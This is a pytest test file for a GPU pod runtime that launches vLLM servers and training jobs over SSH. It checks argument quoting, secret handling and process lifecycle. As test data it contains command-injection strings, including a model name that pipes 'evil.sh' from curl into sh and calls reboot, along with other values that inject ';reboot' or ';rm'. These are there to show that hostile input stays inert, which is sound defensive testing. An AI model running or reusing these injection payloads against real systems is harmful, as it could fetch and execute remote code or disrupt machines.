"""Offline tests for the "pod" runtime: RunPod/Vast pods running the envforge GPU image.

Three layers:

1. command construction with fakes (no ssh, no GPU): what *would* run on the box,
   that secrets stay out of argv, that hostile values stay single arguments;
2. the generated launcher / status / stop scripts executed for real by a local bash
   (`LocalBox`), with the pid/log directories redirected into a temp dir;
3. the image definition itself: Dockerfile pins and entrypoint syntax.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import time
from pathlib import Path

import pytest

from envforge.compute import (
    CommandResult,
    ComputeError,
    SSHBox,
    check,
    detect_runtime,
    probe_runtimes,
    resolve_runtime,
    serve_vllm,
    stop_vllm,
    vllm_logs,
    vllm_status,
)
from envforge.compute import process as proc
from envforge.compute.base import ComputeBox
from envforge.compute.runtime import POD_MARKER, check_runtime, parse_runtime
from envforge.compute.vllm import DEFAULT_VLLM_IMAGE, build_pod_serve
from envforge.train import remote

REPO = Path(__file__).resolve().parents[1]
EVIL = "Qwen/x;curl$IFS'evil.sh'|sh;`id`$(reboot)"


class FakeRunner:
    """Stands in for subprocess under an `SSHBox`; answers by substring of the remote command."""

    def __init__(self, responses: dict[str, CommandResult] | None = None) -> None:
        self.calls: list[dict] = []
        self.responses = responses or {}

    def __call__(self, argv, *, input=None, timeout=None) -> CommandResult:
        self.calls.append({"argv": list(argv), "input": input})
        for needle, result in self.responses.items():
            if needle in argv[-1]:
                return result
        return CommandResult(0, "", "")

    @property
    def remote_commands(self) -> list[str]:
        return [c["argv"][-1] for c in self.calls if c["argv"][0] == "ssh"]


def pod_box(responses: dict[str, CommandResult] | None = None) -> tuple[SSHBox, FakeRunner]:
    runner = FakeRunner(responses)
    return SSHBox("gpu-1", runner=runner), runner


def launch_words(script: str) -> list[str]:
    """The `setsid nohup ...` line of a start script, split as the remote shell would."""
    line = next(ln for ln in script.splitlines() if ln.startswith("setsid "))
    return shlex.split(line)


# ---------------------------------------------------------------- runtime selection


def test_parse_runtime():
    assert parse_runtime("POD") == "pod" and parse_runtime(" docker ") == "docker"
    assert parse_runtime("auto") == "auto"
    with pytest.raises(ValueError):
        parse_runtime("kubernetes")
    with pytest.raises(ValueError):
        check_runtime("auto")  # library functions need a concrete runtime
    with pytest.raises(ValueError):
        serve_vllm(pod_box()[0], "m", runtime="auto")


@pytest.mark.parametrize(
    ("answer", "expected"),
    [
        ("docker=no\npod=yes\n", "pod"),  # RunPod/Vast pod with the envforge image
        ("docker=yes\npod=no\n", "docker"),  # a VM
        ("docker=yes\npod=yes\n", "docker"),  # a working daemon wins
    ],
)
def test_auto_detection(answer, expected):
    box, runner = pod_box({"docker info": CommandResult(0, answer)})
    assert detect_runtime(box) == expected
    assert resolve_runtime(box, "auto") == expected
    probe = runner.remote_commands[0]
    assert "docker info" in probe and POD_MARKER in probe


def test_auto_detection_fails_clearly_when_neither():
    box, _ = pod_box({"docker info": CommandResult(0, "docker=no\npod=no\n")})
    assert probe_runtimes(box).preferred is None
    with pytest.raises(ComputeError, match="envforge GPU image"):
        detect_runtime(box)


def test_explicit_runtime_does_not_probe():
    box, runner = pod_box()
    assert resolve_runtime(box, "pod") == "pod"
    assert runner.calls == []


# ---------------------------------------------------------------- check


def test_pod_check_all_ok():
    box, runner = pod_box(
        {
            "echo envforge-ok": CommandResult(0, "envforge-ok\n"),
            POD_MARKER: CommandResult(0, "0.1.0\n"),
            "nvidia-smi -L": CommandResult(0, "GPU 0: NVIDIA L4 (UUID: x)\n"),
            "python3 -c": CommandResult(0, "vllm 0.30.0, torch 2.9.0, peft 0.17.1\n"),
        }
    )
    results = check(box, runtime="pod")
    assert [r.name for r in results] == ["ssh", "envforge-image", "nvidia-smi", "python-deps"]
    assert all(r.ok for r in results), results
    assert "0.1.0" in results[1].detail and "vllm 0.30.0" in results[3].detail
    assert not any("docker" in c for c in runner.remote_commands)


def test_pod_check_reports_wrong_image_and_import_errors():
    box, _ = pod_box(
        {
            "echo envforge-ok": CommandResult(0, "envforge-ok\n"),
            POD_MARKER: CommandResult(3, "missing\n"),
            "python3 -c": CommandResult(
                1, "", "Traceback...\nModuleNotFoundError: No module named 'peft'\n"
            ),
        }
    )
    results = {r.name: r for r in check(box, runtime="pod")}
    assert not results["envforge-image"].ok and POD_MARKER in results["envforge-image"].detail
    assert not results["python-deps"].ok and "peft" in results["python-deps"].detail


def test_pod_check_skips_after_ssh_failure():
    box, runner = pod_box({"echo": CommandResult(255, "", "ssh: connect timed out")})
    results = check(box, runtime="pod")
    assert [r.name for r in results][1:] == ["envforge-image", "nvidia-smi", "python-deps"]
    assert all(not r.ok for r in results) and len(runner.calls) == 1


# ---------------------------------------------------------------- vLLM in pod mode


def test_pod_serve_argv_shares_vllm_flags():
    argv = build_pod_serve(
        "Qwen/Qwen2.5-7B-Instruct", port=8001, max_model_len=8192, bind="127.0.0.1",
        lora_adapters=["netops-v1"], max_lora_rank=16,
    )  # fmt: skip
    assert argv[:3] == ["vllm", "serve", "Qwen/Qwen2.5-7B-Instruct"]
    assert argv[argv.index("--host") + 1] == "127.0.0.1"
    assert argv[argv.index("--port") + 1] == "8001"  # no port mapping: listens directly
    assert "--enable-auto-tool-choice" in argv
    assert argv[argv.index("--tool-call-parser") + 1] == "hermes"
    assert argv[argv.index("--max-lora-rank") + 1] == "16"
    assert "netops-v1=/root/envforge/adapters/netops-v1" in argv  # real path, not /adapters
    assert build_pod_serve("m")[build_pod_serve("m").index("--host") + 1] == "0.0.0.0"


@pytest.mark.parametrize("bind", ["-x", "a b", "1.2.3.4;reboot"])
def test_pod_serve_rejects_bad_bind(bind):
    with pytest.raises(ValueError):
        build_pod_serve("m", bind=bind)


def test_serve_vllm_pod_starts_detached_process_with_secrets_on_stdin():
    box, runner = pod_box(
        {"setsid nohup": CommandResult(0, "4242\n"), "kill -TERM": CommandResult(0, "none\n")}
    )
    server = serve_vllm(
        box, "meta-llama/Llama-3.1-8B-Instruct", port=8000, runtime="pod",
        api_key="sk-SUPERSECRET", hf_token="hf_SUPERSECRET", tool_call_parser="llama3_json",
        endpoint_host="100.64.0.9",
    )  # fmt: skip
    assert server.runtime == "pod" and server.container == "vllm-8000"
    assert server.container_id == "4242"
    assert server.base_url == "http://100.64.0.9:8000/v1"
    assert server.model_spec == "vllm:meta-llama/Llama-3.1-8B-Instruct"

    commands = runner.remote_commands
    assert "kill -TERM" in commands[0]  # replace=True stops an old server first
    assert not any("docker" in c for c in commands)
    for call in runner.calls:
        assert not any("SUPERSECRET" in a for a in call["argv"]), call["argv"]
    start = runner.calls[-1]
    assert start["input"] == "HF_TOKEN=hf_SUPERSECRET\nVLLM_API_KEY=sk-SUPERSECRET\n"
    script = start["argv"][-1]
    assert "umask 077" in script and "cat > /root/envforge/run/vllm-8000.env" in script
    assert "> /root/envforge/logs/vllm-8000.log 2>&1 < /dev/null &" in script
    assert "echo $! > /root/envforge/run/vllm-8000.pid" in script
    words = launch_words(script)
    assert words[:5] == ["setsid", "nohup", "bash", "-c", proc.WRAPPER]
    serve = words[words.index("vllm") :]
    assert serve[:3] == ["vllm", "serve", "meta-llama/Llama-3.1-8B-Instruct"]
    assert serve[serve.index("--tool-call-parser") + 1] == "llama3_json"
    meta_line = next(ln for ln in script.splitlines() if ln.startswith("printf"))
    meta = json.loads(shlex.split(meta_line)[2])
    assert meta["model"] == "meta-llama/Llama-3.1-8B-Instruct" and meta["port"] == 8000


def test_serve_vllm_pod_without_secrets_still_sends_empty_stdin():
    box, runner = pod_box({"setsid nohup": CommandResult(0, "7\n")})
    serve_vllm(box, "Qwen/Qwen2.5-3B-Instruct", runtime="pod")
    assert runner.calls[-1]["input"] == ""  # never None: ssh must not read the terminal


def test_hostile_model_name_is_one_argument_in_pod_mode():
    box, runner = pod_box({"setsid nohup": CommandResult(0, "7\n")})
    serve_vllm(box, EVIL, runtime="pod", extra_args=["--served-model-name", "a b; reboot"])
    words = launch_words(runner.remote_commands[-1])
    assert EVIL in words and "a b; reboot" in words


def test_serve_vllm_pod_refuses_to_clobber_without_replace():
    box, _ = pod_box({"State:": CommandResult(0, "running|99|\n{}\n")})
    with pytest.raises(ComputeError, match="already running"):
        serve_vllm(box, "m", runtime="pod", replace=False)


def test_vllm_status_pod_running_and_healthy():
    meta = json.dumps({"model": "Qwen/Qwen2.5-3B-Instruct", "bind": "127.0.0.1", "started_at": "t0"})  # fmt: skip
    box, runner = pod_box(
        {"State:": CommandResult(0, f"running|4242|\n{meta}\n"), "curl": CommandResult(0, "401")}
    )
    st = vllm_status(box, 8000, runtime="pod")
    assert st.running and st.exists and st.container == "vllm-8000"
    assert st.model == "Qwen/Qwen2.5-3B-Instruct" and st.started_at == "t0"
    assert st.healthy is True  # 401 = up, it just wants the key
    assert "http://127.0.0.1:8000/v1/models" in runner.remote_commands[-1]


def test_vllm_status_pod_exited_missing_and_no_probe():
    box, runner = pod_box({"State:": CommandResult(0, "exited|4242|1\n{}\n")})
    st = vllm_status(box, 8000, runtime="pod")
    assert st.exists and not st.running and st.state == "exited" and st.healthy is None
    assert not any("curl" in c for c in runner.remote_commands)  # no probe when dead
    box, _ = pod_box({"State:": CommandResult(0, "missing\n")})
    assert not vllm_status(box, 8000, runtime="pod").exists
    box, runner = pod_box({"State:": CommandResult(0, "running|1|\n{}\n")})
    assert vllm_status(box, 8000, runtime="pod", probe=False).running
    assert len(runner.calls) == 1


def test_stop_and_logs_pod():
    box, runner = pod_box({"kill -TERM": CommandResult(0, "stopped\n")})
    assert stop_vllm(box, 8000, runtime="pod") is True
    stop = runner.remote_commands[0]
    assert 'kill -TERM -- "-$pid"' in stop and 'kill -KILL -- "-$pid"' in stop  # whole group
    box, _ = pod_box({"kill -TERM": CommandResult(0, "none\n")})
    assert stop_vllm(box, 8000, runtime="pod") is False
    box, runner = pod_box({"tail": CommandResult(0, "INFO started\n")})
    assert vllm_logs(box, 8000, tail=50, runtime="pod") == "INFO started\n"
    assert runner.remote_commands[0] == "tail -n 50 /root/envforge/logs/vllm-8000.log 2>&1"


def test_docker_mode_untouched_by_default():
    box, runner = pod_box({"docker run": CommandResult(0, "cid\n")})
    server = serve_vllm(box, "Qwen/Qwen2.5-3B-Instruct")
    assert server.runtime == "docker" and server.container == "envforge-vllm-8000"
    assert DEFAULT_VLLM_IMAGE in runner.remote_commands[-1]


# ---------------------------------------------------------------- process bookkeeping


def test_parse_status_variants():
    assert not proc.parse_status("x", "missing\n").exists
    st = proc.parse_status("x", 'running|12|\n{"model": "m"}\n')
    assert st.running and st.pid == 12 and st.exit_code is None and st.meta == {"model": "m"}
    st = proc.parse_status("x", "exited|12|3\nnot json\n")
    assert not st.running and st.exit_code == 3 and st.meta == {}
    st = proc.parse_status("x", "exited|12|\n")  # killed: no exit code recorded
    assert st.exists and not st.running and st.exit_code is None


@pytest.mark.parametrize("name", ["../etc", "a b", "-x", "", "x" * 90, "A"])
def test_process_names_validated(name):
    with pytest.raises(ValueError):
        proc.pid_path(name)


def test_render_env_rejects_multiline_and_bad_names():
    assert proc.render_env({"A": "1", "B": None, "C": ""}) == "A=1\n"
    with pytest.raises(ValueError):
        proc.render_env({"A": "x\ny"})
    with pytest.raises(ValueError):
        proc.render_env({"A;rm": "x"})


# ---------------------------------------------------------------- training in pod mode


class FakePodBox(ComputeBox):
    """A fake pod: a growing log file served through `tail -n +K`, plus pid/exit state."""

    host = "gpu-1"

    def __init__(self, *, exists: bool = False, logs: list[str] | None = None, exit_code: int = 0):
        self.calls: list[str] = []
        self.inputs: list[str | None] = []
        self.puts: list[tuple[str, str]] = []
        self.gets: list[tuple[str, str]] = []
        self.exists = exists
        self.log_versions = list(logs or [""])
        self.exit_code = exit_code
        self.polls = 0

    def _log_now(self) -> str:
        return self.log_versions[min(self.polls, len(self.log_versions) - 1)]

    def run(self, command, *, input=None, timeout=None, check=False) -> CommandResult:
        cmd = command if isinstance(command, str) else shlex.join(command)
        self.calls.append(cmd)
        self.inputs.append(input)
        if "State:" in cmd:  # status script
            if not self.exists:
                return CommandResult(0, "missing\n")
            running = self.polls < len(self.log_versions) - 1
            line = "running|77|" if running else f"exited|77|{self.exit_code}"
            return CommandResult(0, line + '\n{"base": "m"}\n')
        if cmd.startswith("tail -n +"):
            start = int(re.match(r"tail -n \+(\d+)", cmd).group(1)) - 1
            text = self._log_now()
            self.polls += 1
            lines = text.split("\n")  # tail counts "\n" only
            out = "\n".join(lines[start:]) if start < len(lines) else ""
            if " | tr '" in cmd:  # the reader's carriage-return mapping (not "|| true")
                out = out.replace("\r", "\x1e")
            # like the real subprocess runner (text mode): any carriage return left is a newline
            return CommandResult(0, out.replace("\r\n", "\n").replace("\r", "\n"))
        if "setsid nohup" in cmd:
            self.exists = True
            return CommandResult(0, "77\n")
        if "kill -TERM" in cmd:
            self.exists = False
            return CommandResult(0, "stopped\n")
        if cmd.startswith("test "):
            return CommandResult(0 if "adapter_config.json" in cmd else 1)
        return CommandResult(0)

    def put(self, local, remote_path, *, recursive=False):
        self.puts.append((str(local), remote_path))

    def get(self, remote_path, local, *, recursive=False):
        self.gets.append((remote_path, str(local)))


def _dataset(tmp_path: Path) -> Path:
    d = tmp_path / "sft" / "v1"
    d.mkdir(parents=True)
    (d / "train.jsonl").write_text('{"messages": []}\n')
    (d / "val.jsonl").write_text('{"messages": []}\n')
    return d


def test_start_training_pod_runs_uploaded_script_detached(tmp_path):
    box = FakePodBox()
    pname = remote.start_training(
        box, _dataset(tmp_path), base="Qwen/Qwen2.5-7B-Instruct", name="netops-v1",
        args=remote.TrainArgs(max_steps=5), hf_token="hf_secret", runtime="pod",
    )  # fmt: skip
    assert pname == "train-netops-v1"
    assert {r for _, r in box.puts} == {
        "/root/envforge/jobs/netops-v1/train.jsonl",
        "/root/envforge/jobs/netops-v1/val.jsonl",
        "/root/envforge/jobs/netops-v1/sft.py",
    }
    start = next(c for c in box.calls if "setsid nohup" in c)
    assert "docker" not in start and "pip install" not in start  # deps are in the image
    assert "hf_secret" not in " ".join(box.calls)
    assert box.inputs[box.calls.index(start)] == "HF_TOKEN=hf_secret\nPYTHONUNBUFFERED=1\n"
    assert "cd /root/envforge/jobs/netops-v1" in start
    words = launch_words(start)
    sft = words[words.index("python3") :]
    assert sft[:4] == ["python3", "/root/envforge/jobs/netops-v1/sft.py", "--data", "/root/envforge/jobs/netops-v1/train.jsonl"]  # fmt: skip
    assert sft[sft.index("--val") + 1] == "/root/envforge/jobs/netops-v1/val.jsonl"
    assert sft[sft.index("--out") + 1] == "/root/envforge/adapters/netops-v1"
    assert sft[sft.index("--max-steps") + 1] == "5"
    assert "> /root/envforge/logs/train-netops-v1.log" in start


def test_start_training_pod_refuses_to_clobber_then_replaces(tmp_path):
    d = _dataset(tmp_path)
    with pytest.raises(ComputeError, match="already exists"):
        remote.start_training(FakePodBox(exists=True), d, base="m", name="v1", runtime="pod")
    box = FakePodBox(exists=True)
    remote.start_training(box, d, base="m", name="v1", runtime="pod", replace=True)
    assert any("kill -TERM" in c for c in box.calls)


def test_start_training_pod_validates_base_before_uploading(tmp_path):
    box = FakePodBox()
    with pytest.raises(ValueError):
        remote.start_training(
            box, _dataset(tmp_path), base="--trust-remote-code", name="v1", runtime="pod"
        )
    assert box.puts == []


def test_follow_pod_reads_only_new_complete_lines():
    e = lambda **kw: "ENVFORGE " + json.dumps(kw) + "\n"  # noqa: E731
    logs = [
        "loading\n" + e(event="log", step=1, loss=2.0) + 'ENVFORGE {"event": "log", "st',
        "loading\n" + e(event="log", step=1, loss=2.0) + e(event="log", step=2, loss=1.5)
        + "not json ENVFORGE\nENVFORGE {broken\n",
        "loading\n" + e(event="log", step=1, loss=2.0) + e(event="log", step=2, loss=1.5)
        + "not json ENVFORGE\nENVFORGE {broken\n" + e(event="done", final_train_loss=1.4).rstrip("\n"),
    ]  # fmt: skip
    box = FakePodBox(exists=True, logs=logs, exit_code=0)
    events = list(remote.follow(box, "v1", sleep=lambda s: None, runtime="pod"))
    assert [ev.get("step", ev["event"]) for ev in events] == [1, 2, "done", "exit"]
    assert events[-1] == {"event": "exit", "code": 0}
    reads = [c for c in box.calls if c.startswith("tail -n +")]
    assert reads[0].startswith("tail -n +1 /root/envforge/logs/train-v1.log")
    assert reads[1].startswith("tail -n +3 ")  # 2 complete lines consumed; partial re-read


def test_follow_pod_survives_progress_bar_carriage_returns():
    """Progress bars redraw a line with "\r". The text-mode subprocess layer turns those into
    newlines; if the poller counted them as lines, the next `tail -n +K` would skip events
    (a real bug: whole training runs ended with an empty loss history)."""
    e = lambda **kw: "ENVFORGE " + json.dumps(kw) + "\n"  # noqa: E731
    bars = "Loading 0%\rLoading 50%\rLoading 100%\r"
    logs = [
        bars + e(event="start", total_steps=3),
        bars + e(event="start", total_steps=3) + " 33%\r 66%\r" + e(event="log", step=1, loss=0.7),
        bars + e(event="start", total_steps=3) + " 33%\r 66%\r" + e(event="log", step=1, loss=0.7)
        + e(event="log", step=2, loss=0.6) + "100%\r" + e(event="done", final_train_loss=0.5),
    ]  # fmt: skip
    box = FakePodBox(exists=True, logs=logs, exit_code=0)
    events = list(remote.follow(box, "v1", sleep=lambda s: None, runtime="pod"))
    assert [ev["event"] for ev in events] == ["start", "log", "log", "done", "exit"]
    reads = [c for c in box.calls if c.startswith("tail -n +")]
    assert reads[1].startswith("tail -n +2 ") and reads[2].startswith("tail -n +3 ")  # real lines


def test_follow_pod_reports_failure_code():
    box = FakePodBox(exists=True, logs=["Traceback\n"], exit_code=1)
    events = list(remote.follow(box, "v1", sleep=lambda s: None, runtime="pod"))
    assert events == [{"event": "exit", "code": 1}]


def test_status_logs_and_cleanup_pod():
    box = FakePodBox(exists=True, logs=["a\n"], exit_code=0)
    st = remote.status(box, "v1", runtime="pod")
    assert st.exists and not st.running and st.exit_code == 0
    remote.logs(box, "v1", 20, runtime="pod")
    assert box.calls[-1] == "tail -n 20 /root/envforge/logs/train-v1.log 2>&1"
    remote.remove_container(box, "v1", runtime="pod")
    assert "kill -TERM" in box.calls[-1] and not remote.status(box, "v1", runtime="pod").exists


# ---------------------------------------------------------------- real scripts, local bash


class LocalBox(ComputeBox):
    """Runs the 'remote' scripts with a local bash: proves they actually work."""

    host = "localhost"

    def run(self, command, *, input=None, timeout=None, check=False) -> CommandResult:
        cmd = command if isinstance(command, str) else shlex.join(command)
        p = subprocess.run(
            ["bash", "-c", cmd], input=input or "", capture_output=True, text=True, timeout=timeout
        )
        r = CommandResult(p.returncode, p.stdout, p.stderr)
        return r.raise_for_status("local command") if check else r

    def put(self, local, remote_path, *, recursive=False):
        shutil.copy(local, remote_path)

    def get(self, remote_path, local, *, recursive=False):
        shutil.copytree(remote_path, Path(local) / Path(remote_path).name)


needs_setsid = pytest.mark.skipif(
    shutil.which("setsid") is None or not Path("/proc/self/status").exists(),
    reason="needs util-linux setsid and /proc",
)


@pytest.fixture
def local_dirs(tmp_path, monkeypatch):
    monkeypatch.setattr(proc, "RUN_DIR", str(tmp_path / "run"))
    monkeypatch.setattr(proc, "LOGS_DIR", str(tmp_path / "logs"))
    return tmp_path


def _wait(predicate, timeout=10.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return True
        time.sleep(0.05)
    return False


@needs_setsid
def test_local_process_lifecycle_with_secret_and_exit_code(local_dirs):
    box = LocalBox()
    marker = local_dirs / "PWNED"
    hostile = f"x; touch {marker} $(touch {marker})"
    script = (
        "import os, sys; print('ENVFORGE ' + __import__('json').dumps({'event': 'log'}));"
        "print('secret-ok' if os.environ.get('MY_TOKEN') == 'tok$en with spaces' else 'secret-missing');"
        "print('arg:' + sys.argv[1]); sys.exit(3)"
    )
    pid = proc.start_detached(
        box, "job-1", [sys.executable, "-c", script, hostile],
        secrets={"MY_TOKEN": "tok$en with spaces"}, meta={"model": "m"},
    )  # fmt: skip
    assert pid > 0
    assert _wait(lambda: not proc.process_status(box, "job-1").running)
    st = proc.process_status(box, "job-1")
    assert st.exists and st.exit_code == 3 and st.meta == {"model": "m"}
    log = Path(proc.log_path("job-1")).read_text()
    assert "secret-ok" in log and f"arg:{hostile}" in log and "ENVFORGE" in log
    assert not marker.exists()  # the hostile argument was never evaluated by a shell
    assert not Path(proc.env_path("job-1")).exists()  # secrets file deleted after reading
    assert oct(Path(proc.log_path("job-1")).stat().st_mode & 0o777) == "0o600"
    assert proc.stop_detached(box, "job-1") is True  # forget a finished process
    assert not proc.process_status(box, "job-1").exists
    assert proc.stop_detached(box, "job-1") is False


@needs_setsid
def test_local_stop_kills_the_whole_process_group(local_dirs):
    box = LocalBox()
    # a parent that spawns a child, like vLLM's API server + engine workers
    proc.start_detached(box, "srv", ["bash", "-c", "sleep 300 & sleep 300; wait"],
                        secrets={"VLLM_API_KEY": "sk-local-secret"})  # fmt: skip
    st = proc.process_status(box, "srv")
    assert st.running and st.pid
    assert _wait(lambda: len(_group_members(st.pid)) >= 3)  # wrapper + bash + 2x sleep
    cmdlines = [_cmdline(p) for p in _group_members(st.pid)]
    assert not any("sk-local-secret" in c for c in cmdlines)  # not in argv / ps
    assert proc.stop_detached(box, "srv", grace_s=5) is True
    assert _wait(lambda: not _group_members(st.pid))
    assert not proc.process_status(box, "srv").exists


def _group_members(pgid: int) -> list[int]:
    members = []
    for entry in os.listdir("/proc"):
        if not entry.isdigit():
            continue
        try:
            fields = Path(f"/proc/{entry}/stat").read_text().rsplit(")", 1)[1].split()
        except (OSError, IndexError):
            continue
        # fields after "(comm)": state ppid pgrp ...; ignore zombies awaiting reaping
        if int(fields[2]) == pgid and fields[0] != "Z":
            members.append(int(entry))
    return members


def _cmdline(pid: int) -> str:
    try:
        return Path(f"/proc/{pid}/cmdline").read_bytes().replace(b"\0", b" ").decode()
    except OSError:
        return ""


@needs_setsid
def test_local_follow_end_to_end(local_dirs, monkeypatch):
    """remote.follow in pod mode against a real detached process writing a real log."""
    box = LocalBox()
    script = (
        "import json, time\n"
        "for i in range(3):\n"
        "    print('ENVFORGE ' + json.dumps({'event': 'log', 'step': i}), flush=True)\n"
        "    time.sleep(0.1)\n"
        "print('ENVFORGE ' + json.dumps({'event': 'done'}), end='', flush=True)\n"
    )
    proc.start_detached(box, remote.process_name("e2e"), [sys.executable, "-c", script])
    events = list(remote.follow(box, "e2e", poll_s=0.05, sleep=time.sleep, runtime="pod"))
    assert [ev.get("step", ev["event"]) for ev in events] == [0, 1, 2, "done", "exit"]
    assert events[-1]["code"] == 0


# ---------------------------------------------------------------- the image definition


def test_dockerfile_base_matches_pinned_vllm_image():
    text = (REPO / "deploy/gpu/Dockerfile").read_text()
    m = re.search(r"^ARG VLLM_IMAGE=(\S+)$", text, re.M)
    assert m and m.group(1) == DEFAULT_VLLM_IMAGE, "bump deploy/gpu/Dockerfile with vllm.py"
    assert re.search(r"^FROM \$\{VLLM_IMAGE\}", text, re.M)
    assert f"COPY envforge/train/sft.py {POD_MARKER}" in text
    assert re.search(r"^ENTRYPOINT \[.*tini.*entrypoint\.sh", text, re.M)


def test_entrypoint_is_valid_bash_and_never_traces():
    path = REPO / "deploy/gpu/entrypoint.sh"
    subprocess.run(["bash", "-n", str(path)], check=True)
    text = path.read_text()
    assert "set -x" not in text  # tracing would print TS_AUTHKEY
    assert '--auth-key="file:' in text  # the key never goes on argv
    sshd = (REPO / "deploy/gpu/sshd_config").read_text()
    assert re.search(r"^PasswordAuthentication no$", sshd, re.M)
